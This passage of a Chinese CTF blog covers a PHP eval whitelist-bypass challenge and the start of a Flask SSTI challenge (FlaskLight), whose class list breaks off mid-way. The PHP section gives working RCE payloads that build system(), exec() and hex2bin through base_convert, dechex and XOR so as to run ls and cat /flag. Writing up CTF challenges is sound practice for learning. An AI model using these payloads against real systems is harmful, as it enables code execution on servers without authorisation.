class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<p>需要先知道几个PHP的特性：</p>
<ul>
<li>动态函数。<code>$func='print_r';$func('hello');</code>，这句代码是能够输出hello的，那是因为<code>$func</code>被<code>print_r</code>代替，因此能够成功执行。</li>
<li>函数名为字符串。从上面的例子也可以看出函数名是字符串。</li>
</ul>
<p>先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数<code>c</code>不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到<code>eval('echo '.$content.';');</code>。</p>
<p>因此，本题考察的应该是RCE。我们<strong>需要将<code>$content</code>通过某种方式变为类似<code>system('ls')</code>命令</strong>。</p>
<h2 id="方法1">方法1</h2>
<p>先放出最开始的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">因此，等价于system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>也成功被执行：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
<p>但是，当执行有特殊符号的时候就不行了，比如<code>system('ls /')</code>，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用<code>hex2bin</code>将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /的16进制表示)</span><br><span class="line">因此，等价于system(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>但是，此时的长度已经超过80了。</p>
<hr />
<center>
小知识
</center>
<p>接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
<p>这样子最终传入的<code>p</code>为<code>system(id)</code>。</p>
<hr />
<p>因此可以利用这种办法只在<code>c</code>参数传入必要的，剩下的都通过上述方式放到<code>c</code>中。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">这样子($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">其中，&#123;&#125;用于代替[]，即$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
<p>然后再传入<code>min=system</code>和<code>max=ls /</code>即可。最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
<p>将<code>max=cat /flag</code>带入即可得到flag。</p>
<p>也可以直接执行，不过要找到比较短的命令（思路也是类似的）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
<h2 id="方法2">方法2</h2>
<p>利用一个函数<code>getallheaders</code>，然后把命令通过HTTP头部传入。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">因此，等价于exec(getallheaders()&#123;2&#125;)，就是获取HTTP头部信息中，字段为2的内容。</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
<h2 id="方法3">方法3</h2>
<p>前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
<p>会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
<p>因此，最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">总结</h1>
<p>这题考察的都是关于PHP的知识（我这不会PHP的太难了）</p>
<ul>
<li>各种编码转换绕过</li>
<li>URL中使用<code>$_GET</code>获取数据</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP知识</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCCTF 2019 Qual FlaskLight</title>
    <url>/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight">FlaskLight</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入页面查看源码得到提示信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Parameter Name: search --&gt;</span><br><span class="line">&lt;!-- Method: GET --&gt;</span><br></pre></td></tr></table></figure></p>
<p>经过测试，这里确实存在着SSTI。</p>
<h1 id="解题">解题</h1>
<p>首先寻找可以用的类： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0. type &#x27;type&#x27;</span><br><span class="line">1. type &#x27;weakref&#x27;</span><br><span class="line">2. type &#x27;weakcallableproxy&#x27;</span><br><span class="line">3. type &#x27;weakproxy&#x27;</span><br><span class="line">4. type &#x27;int&#x27;</span><br><span class="line">5. type &#x27;basestring&#x27;</span><br><span class="line">6. type &#x27;bytearray&#x27;</span><br><span class="line">7. type &#x27;list&#x27;</span><br><span class="line">8. type &#x27;NoneType&#x27;</span><br><span class="line">9. type &#x27;NotImplementedType&#x27;</span><br><span class="line">10. type &#x27;traceback&#x27;</span><br><span class="line">11. type &#x27;super&#x27;</span><br><span class="line">12. type &#x27;xrange&#x27;</span><br><span class="line">13. type &#x27;dict&#x27;</span><br><span class="line">14. type &#x27;set&#x27;</span><br><span class="line">15. type &#x27;slice&#x27;</span><br><span class="line">16. type &#x27;staticmethod&#x27;</span><br><span class="line">17. type &#x27;complex&#x27;</span><br><span class="line">18. type &#x27;float&#x27;</span><br><span class="line">19. type &#x27;buffer&#x27;</span><br><span class="line">20. type &#x27;long&#x27;</span><br><span class="line">21. type &#x27;frozenset&#x27;</span><br><span class="line">22. type &#x27;property&#x27;</span><br><span class="line">23. type &#x27;memoryview&#x27;</span><br><span class="line">24. type &#x27;tuple&#x27;</span><br><span class="line">25. type &#x27;enumerate&#x27;</span><br><span class="line">26. type &#x27;reversed&#x27;</span><br><span class="line">27. type &#x27;code&#x27;</span><br><span class="line">28. type &#x27;frame&#x27;</span><br><span class="line">29. type &#x27;builtin_function_or_method&#x27;</span><br><span class="line">30. type &#x27;instancemethod&#x27;</span><br><span class="line">31. type &#x27;function&#x27;</span><br><span class="line">32. type &#x27;classobj&#x27;</span><br><span class="line">33. type &#x27;dictproxy&#x27;</span><br><span class="line">34. type &#x27;generator&#x27;</span><br><span class="line">35. type &#x27;getset_descriptor&#x27;</span><br><span class="line">36. type &#x27;wrapper_descriptor&#x27;</span><br><span class="line">37. type &#x27;instance&#x27;</span><br><span class="line">38. type &#x27;ellipsis&#x27;</span><br><span class="line">39. type &#x27;member_descriptor&#x27;</span><br><span class="line">40. type &#x27;file&#x27;</span><br><span class="line">41. type &#x27;PyCapsule&#x27;</span><br><span class="line">42. type &#x27;cell&#x27;</span><br><span class="line">43. type &#x27;callable-iterator&#x27;</span><br><span class="line">44. type &#x27;iterator&#x27;</span><br><span class="line">45. type &#x27;sys.long_info&#x27;</span><br><span class="line">46. type &#x27;sys.float_info&#x27;</span><br><span class="line">47. type &#x27;EncodingMap&#x27;</span><br><span class="line">48. type &#x27;fieldnameiterator&#x27;</span><br><span class="line">49. type &#x27;formatteriterator&#x27;</span><br><span class="line">50. type &#x27;sys.version_info&#x27;</span><br><span class="line">51. type &#x27;sys.flags&#x27;</span><br><span class="line">52. type &#x27;exceptions.BaseException&#x27;</span><br><span class="line">53. type &#x27;module&#x27;</span><br><span class="line">54. type &#x27;imp.NullImporter&#x27;</span><br><span class="line">55. type &#x27;zipimport.zipimporter&#x27;</span><br><span class="line">56. type &#x27;posix.stat_result&#x27;</span><br><span class="line">57. type &#x27;posix.statvfs_result&#x27;</span><br><span class="line">58. class &#x27;warnings.WarningMessage&#x27;</span><br><span class="line">59. class &#x27;warnings.catch_warnings&#x27;</span><br><span class="line">60. class &#x27;_weakrefset._IterationGuard&#x27;</span><br><span class="line">61. class &#x27;_weakrefset.WeakSet&#x27;</span><br><span class="line">62. class &#x27;_abcoll.Hashable&#x27;</span><br><span class="line">63. type &#x27;classmethod&#x27;</span><br><span class="line">64. class &#x27;_abcoll.Iterable&#x27;</span><br><span class="line">65. class &#x27;_abcoll.Sized&#x27;</span><br><span class="line">66. class &#x27;_abcoll.Container&#x27;</span><br><span class="line">67. class &#x27;_abcoll.Callable&#x27;</span><br><span class="line">68. type &#x27;dict_keys&#x27;</span><br><span class="line">69. type &#x27;dict_items&#x27;</span><br><span class="line">70. type &#x27;dict_values&#x27;</span><br><span class="line">71. class &#x27;site._Printer&#x27;</span><br><span class="line">72. class &#x27;site._Helper&#x27;</span><br><span class="line">73. type &#x27;_sre.SRE_Pattern&#x27;</span><br><span class="line">74. type &#x27;_sre.SRE_Match&#x27;</span><br><span class="line">75. type &#x27;_sre.SRE_Scanner&#x27;</span><br><span class="line">76. class &#x27;site.Quitter&#x27;</span><br><span class="line">77. class &#x27;codecs.IncrementalEncoder&#x27;</span><br><span class="line">78. class &#x27;codecs.IncrementalDecoder&#x27;</span><br><span class="line">79. class &#x27;string.Template&#x27;</span><br><span class="line">80. class &#x27;string.Formatter&#x27;</span><br><span class="line">81. type &#x27;collections.deque&#x27;</span><br><span class="line">82. type &#x27;deque_iterator&#x27;</span><br><span class="line">83. type &#x27;deque_reverse_iterator&#x27;</span><br><span class="line">84. type &#x27;operator.itemgetter&#x27;</span><br><span class="line">85. type &#x27;operator.attrgetter&#x27;</span><br><span class="line">86. type &#x27;operator.methodcaller&#x27;</span><br><span class="line">87. type &#x27;itertools.combinations&#x27;</span><br><span class="line">88. type &#x27;itertools.combinations_with_replacement&#x27;</span><br><span class="line">89. type &#x27;itertools.cycle&#x27;</span><br><span class="line">90. type &#x27;itertools.dropwhile&#x27;</span><br><span class="line">91. type &#x27;itertools.takewhile&#x27;</span><br><span class="line">92. type &#x27;itertools.islice&#x27;</span><br><span class="line">93. type &#x27;itertools.starmap&#x27;</span><br><span class="line">94. type &#x27;itertools.imap&#x27;</span><br><span class="line">95. type &#x27;itertools.chain&#x27;</span><br><span class="line">96. type &#x27;itertools.compress&#x27;</span><br><span class="line">97. type &#x27;itertools.ifilter&#x27;</span><br><span class="line">98. type &#x27;itertools.ifilterfalse&#x27;</span><br><span class="line">99. type &#x27;itertools.count&#x27;</span><br><span class="line">100. type &#x27;itertools.izip&#x27;</span><br><span class="line">101. type &#x27;itertools.izip_longest&#x27;</span><br><span class="line">102. type &#x27;itertools.permutations&#x27;</span><br><span class="line">103. type &#x27;itertools.product&#x27;</span><br><span class="line">104. type &#x27;itertools.repeat&#x27;</span><br><span class="line">105. type &#x27;itertools.groupby&#x27;</span><br><span class="line">106. type &#x27;itertools.tee_dataobject&#x27;</span><br><span class="line">107. type &#x27;itertools.tee&#x27;</span><br><span class="line">108. type &#x27;itertools._grouper&#x27;</span><br><span class="line">109. type &#x27;_thread._localdummy&#x27;</span><br><span class="line">110. type &#x27;thread._local&#x27;</span><br><span class="line">111. type &#x27;thread.lock&#x27;</span><br><span class="line">112. type &#x27;method_descriptor&#x27;</span><br><span class="line">113. class &#x27;markupsafe._MarkupEscapeHelper&#x27;</span><br><span class="line">114. type &#x27;_io._IOBase&#x27;</span><br><span class="line">115. type &#x27;_io.IncrementalNewlineDecoder&#x27;</span><br><span class="line">116. type &#x27;_hashlib.HASH&#x27;</span><br><span class="line">117. type &#x27;_random.Random&#x27;</span><br><span class="line">118. type &#x27;cStringIO.StringO&#x27;</span><br><span class="line">119. type &#x27;cStringIO.StringI&#x27;</span><br><span class="line">120. type &#x27;cPickle.Unpickler&#x27;</span><br><span class="line">121. type &#x27;cPickle.Pickler&#x27;</span><br><span class="line">122. type &#x27;functools.partial&#x27;</span><br><span class="line">123. type &#x27;_ssl._SSLContext&#x27;</span><br><span class="line">124. type &#x27;_ssl._SSLSocket&#x27;</span><br><span class="line">125. class &#x27;socket._closedsocket&#x27;</span><br><span class="line">126. type &#x27;_socket.socket&#x27;</span><br><span class="line">127. class &#x27;socket._socketobject&#x27;</span><br><span class="line">128. class &#x27;socket._fileobject&#x27;</span><br><span class="line">129. type &#x27;time.struct_time&#x27;</span><br><span class="line">130. type &#x27;Struct&#x27;</span><br><span class="line">131. class &#x27;urlparse.ResultMixin&#x27;</span><br><span class="line">132. class &#x27;contextlib.GeneratorContextManager&#x27;</span><br><span class="line">133. class &#x27;contextlib.closing&#x27;</span><br><span class="line">134. type &#x27;_json.Scanner&#x27;</span><br><span class="line">135. type &#x27;_json.Encoder&#x27;</span><br><span class="line">136. class &#x27;json.decoder.JSONDecoder&#x27;</span><br><span class="line">137. class &#x27;json.encoder.JSONEncoder&#x27;</span><br><span class="line">138. class &#x27;threading._Verbose&#x27;</span><br><span class="line">139. class &#x27;jinja2.utils.MissingType&#x27;</span><br><span class="line">140. class &#x27;jinja2.utils.LRUCache&#x27;</span><br><span class="line">141. class &#x27;jinja2.utils.Cycler&#x27;</span><br><span class="line">142. class &#x27;jinja2.utils.Joiner&#x27;</span><br><span class="line">143. class &#x27;jinja2.utils.Namespace&#x27;</span><br><span class="line">144. class &#x27;jinja2.bccache.Bucket&#x27;</span><br><span class="line">145. class &#x27;jinja2.bccache.BytecodeCache&#x27;</span><br><span class="line">146. class &#x27;jinja2.nodes.EvalContext&#x27;</span><br><span class="line">147. class &#x27;jinja2.visitor.NodeVisitor&#x27;</span><br><span class="line">148. class &#x27;jinja2.nodes.Node&#x27;</span><br><span class="line">149. class &#x27;jinja2.idtracking.Symbols&#x27;</span><br><span class="line">150. class &#x27;jinja2.compiler.MacroRef&#x27;</span><br><span class="line">151. class &#x27;jinja2.compiler.Frame&#x27;</span><br><span class="line">152. class &#x27;jinja2.runtime.TemplateReference&#x27;</span><br><span class="line">153. class &#x27;numbers.Number&#x27;</span><br><span class="line">154. class &#x27;jinja2.runtime.Context&#x27;</span><br><span class="line">155. class &#x27;jinja2.runtime.BlockReference&#x27;</span><br><span class="line">156. class &#x27;jinja2.runtime.Macro&#x27;</span><br><span class="line">157. class &#x27;jinja2.runtime.Undefined&#x27;</span><br><span class="line">158. class &#x27;decimal.Decimal&#x27;</span><br><span class="line">159. class &#x27;decimal._ContextManager&#x27;</span><br><span class="line">160. class &#x27;decimal.Context&#x27;</span><br><span class="line">161. class &#x27;decimal._WorkRep&#x27;</span><br><span class="line">162. class &#x27;decimal._Log10Memoize&#x27;</span><br><span class="line">163. type &#x27;_ast.AST&#x27;</span><br><span class="line">164. class &#x27;ast.NodeVisitor&#x27;</span><br><span class="line">165. class &#x27;jinja2.lexer.Failure&#x27;</span><br><span class="line">166. class &#x27;jinja2.lexer.TokenStreamIterator&#x27;</span><br><span class="line">167. class &#x27;jinja2.lexer.TokenStream&#x27;</span><br><span class="line">168. class &#x27;jinja2.lexer.Lexer&#x27;</span><br><span class="line">169. class &#x27;jinja2.parser.Parser&#x27;</span><br><span class="line">170. class &#x27;jinja2.environment.Environment&#x27;</span><br><span class="line">171. class &#x27;jinja2.environment.Template&#x27;</span><br><span class="line">172. class &#x27;jinja2.environment.TemplateModule&#x27;</span><br><span class="line">173. class &#x27;jinja2.environment.TemplateExpression&#x27;</span><br><span class="line">174. class &#x27;jinja2.environment.TemplateStream&#x27;</span><br><span class="line">175. class &#x27;jinja2.loaders.BaseLoader&#x27;</span><br><span class="line">176. type &#x27;datetime.date&#x27;</span><br><span class="line">177. type &#x27;datetime.timedelta&#x27;</span><br><span class="line">178. type &#x27;datetime.time&#x27;</span><br><span class="line">179. type &#x27;datetime.tzinfo&#x27;</span><br><span class="line">180. class &#x27;logging.LogRecord&#x27;</span><br><span class="line">181. class &#x27;logging.Formatter&#x27;</span><br><span class="line">182. class &#x27;logging.BufferingFormatter&#x27;</span><br><span class="line">183. class &#x27;logging.Filter&#x27;</span><br><span class="line">184. class &#x27;logging.Filterer&#x27;</span><br><span class="line">185. class &#x27;logging.PlaceHolder&#x27;</span><br><span class="line">186. class &#x27;logging.Manager&#x27;</span><br><span class="line">187. class &#x27;logging.LoggerAdapter&#x27;</span><br><span class="line">188. class &#x27;werkzeug._internal._Missing&#x27;</span><br><span class="line">189. class &#x27;werkzeug._internal._DictAccessorProperty&#x27;</span><br><span class="line">190. class &#x27;werkzeug.utils.HTMLBuilder&#x27;</span><br><span class="line">191. class &#x27;werkzeug.exceptions.Aborter&#x27;</span><br><span class="line">192. class &#x27;werkzeug.urls.Href&#x27;</span><br><span class="line">193. type &#x27;select.epoll&#x27;</span><br><span class="line">194. class &#x27;click._compat._FixupStream&#x27;</span><br><span class="line">195. class &#x27;click._compat._AtomicFile&#x27;</span><br><span class="line">196. class &#x27;click.utils.LazyFile&#x27;</span><br><span class="line">197. class &#x27;click.utils.KeepOpenFile&#x27;</span><br><span class="line">198. class &#x27;click.utils.PacifyFlushWrapper&#x27;</span><br><span class="line">199. class &#x27;click.parser.Option&#x27;</span><br><span class="line">200. class &#x27;click.parser.Argument&#x27;</span><br><span class="line">201. class &#x27;click.parser.ParsingState&#x27;</span><br><span class="line">202. class &#x27;click.parser.OptionParser&#x27;</span><br><span class="line">203. class &#x27;click.types.ParamType&#x27;</span><br><span class="line">204. class &#x27;click.formatting.HelpFormatter&#x27;</span><br><span class="line">205. class &#x27;click.core.Context&#x27;</span><br><span class="line">206. class &#x27;click.core.BaseCommand&#x27;</span><br><span class="line">207. class &#x27;click.core.Parameter&#x27;</span><br><span class="line">208. class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span><br><span class="line">209. class &#x27;werkzeug.serving._SSLContext&#x27;</span><br><span class="line">210. class &#x27;werkzeug.serving.BaseWSGIServer&#x27;</span><br><span class="line">211. class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span><br><span class="line">212. class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span><br><span class="line">213. class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span><br><span class="line">214. class &#x27;werkzeug.datastructures.ViewItems&#x27;</span><br><span class="line">215. class &#x27;werkzeug.datastructures._omd_bucket&#x27;</span><br><span class="line">216. class &#x27;werkzeug.datastructures.Headers&#x27;</span><br><span class="line">217. class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span><br><span class="line">218. class &#x27;werkzeug.datastructures.IfRange&#x27;</span><br><span class="line">219. class &#x27;werkzeug.datastructures.Range&#x27;</span><br><span class="line">220. class &#x27;werkzeug.datastructures.ContentRange&#x27;</span><br><span class="line">221. class &#x27;werkzeug.datastructures.FileStorage&#x27;</span><br><span class="line">222. class &#x27;email.LazyImporter&#x27;</span><br><span class="line">223. class &#x27;calendar.Calendar&#x27;</span><br><span class="line">224. class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span><br><span class="line">225. class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span><br><span class="line">226. class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span><br><span class="line">227. class &#x27;werkzeug.wsgi.ClosingIterator&#x27;</span><br><span class="line">228. class &#x27;werkzeug.wsgi.FileWrapper&#x27;</span><br><span class="line">229. class &#x27;werkzeug.wsgi._RangeWrapper&#x27;</span><br><span class="line">230. class &#x27;werkzeug.formparser.FormDataParser&#x27;</span><br><span class="line">231. class &#x27;werkzeug.formparser.MultiPartParser&#x27;</span><br><span class="line">232. class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span><br><span class="line">233. class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span><br><span class="line">234. class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span><br><span class="line">235. class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span><br><span class="line">236. class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span><br><span class="line">237. class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span><br><span class="line">238. class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;</span><br><span class="line">239. class &#x27;werkzeug.wrappers.cors.CORSResponseMixin&#x27;</span><br><span class="line">240. class &#x27;werkzeug.useragents.UserAgentParser&#x27;</span><br><span class="line">241. class &#x27;werkzeug.useragents.UserAgent&#x27;</span><br><span class="line">242. class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span><br><span class="line">243. class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span><br><span class="line">244. class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span><br><span class="line">245. class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span><br><span class="line">246. class &#x27;werkzeug.test._TestCookieHeaders&#x27;</span><br><span class="line">247. class &#x27;werkzeug.test._TestCookieResponse&#x27;</span><br><span class="line">248. class &#x27;werkzeug.test.EnvironBuilder&#x27;</span><br><span class="line">249. class &#x27;werkzeug.test.Client&#x27;</span><br><span class="line">250. class &#x27;uuid.UUID&#x27;</span><br><span class="line">251. type &#x27;CArgObject&#x27;</span><br><span class="line">252. type &#x27;_ctypes.CThunkObject&#x27;</span><br><span class="line">253. type &#x27;_ctypes._CData&#x27;</span><br><span class="line">254. type &#x27;_ctypes.CField&#x27;</span><br><span class="line">255. type &#x27;_ctypes.DictRemover&#x27;</span><br><span class="line">256. class &#x27;ctypes.CDLL&#x27;</span><br><span class="line">257. class &#x27;ctypes.LibraryLoader&#x27;</span><br><span class="line">258. class &#x27;subprocess.Popen&#x27;</span><br><span class="line">259. class &#x27;itsdangerous._json._CompactJSON&#x27;</span><br><span class="line">260. class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span><br><span class="line">261. class &#x27;itsdangerous.signer.Signer&#x27;</span><br><span class="line">262. class &#x27;itsdangerous.serializer.Serializer&#x27;</span><br><span class="line">263. class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span><br><span class="line">264. class &#x27;flask._compat._DeprecatedBool&#x27;</span><br><span class="line">265. class &#x27;werkzeug.local.Local&#x27;</span><br><span class="line">266. class &#x27;werkzeug.local.LocalStack&#x27;</span><br><span class="line">267. class 